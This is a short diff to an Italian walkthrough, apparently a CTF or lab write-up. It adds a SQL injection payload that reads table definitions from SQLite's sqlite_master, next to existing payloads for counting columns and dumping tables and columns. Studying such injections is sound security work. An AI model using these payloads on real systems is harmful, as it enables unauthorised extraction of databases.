@@ -47,6 +47,7 @@ A questo punto estraggo il numero delle tabelle presenti, il loro nome, le colon
 
 ```
 * ABC\' order by 6 --
+* ABC\' union SELECT 1,sql,3 FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name NOT LIKE \'sqlite_%\' --
 * ABC\' union SELECT 1,sql,3 FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name NOT LIKE \'sqlite_%\' AND name=\'<TABLE>\' --
 * ABC\' union SELECT 1,<COLUMN>,3 FROM <TABLE> --
 ```
